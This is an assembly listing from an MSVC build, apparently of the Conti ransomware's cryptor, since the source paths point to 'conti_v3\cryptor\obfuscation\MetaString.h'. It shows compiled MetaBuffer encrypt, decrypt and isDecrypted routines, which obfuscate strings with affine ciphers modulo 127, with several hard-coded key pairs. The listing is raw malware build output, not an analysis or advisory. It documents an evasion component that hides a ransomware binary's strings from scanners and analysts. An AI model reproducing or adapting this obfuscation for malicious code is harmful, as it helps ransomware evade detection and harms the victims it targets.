?isDecrypted@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 09 00 00 00	 mov	 ecx, 9
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 17	 imul	 r8d, ecx, 23

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 0b	 imul	 r8d, eax, 11
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 09	 add	 r8d, 9
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 54	 sub	 eax, 84			; 00000054H
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 54	 add	 r8d, 84			; 00000054H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 13 00 00 00	 mov	 ecx, 19
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 13	 add	 r8d, 19
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 18 00 00 00	 mov	 ecx, 24
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2a	 imul	 r8d, ecx, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 08	 add	 eax, 8
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 39	 sub	 eax, 57			; 00000039H
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 39	 add	 r8d, 57			; 00000039H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 4c	 sub	 eax, 76			; 0000004cH
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
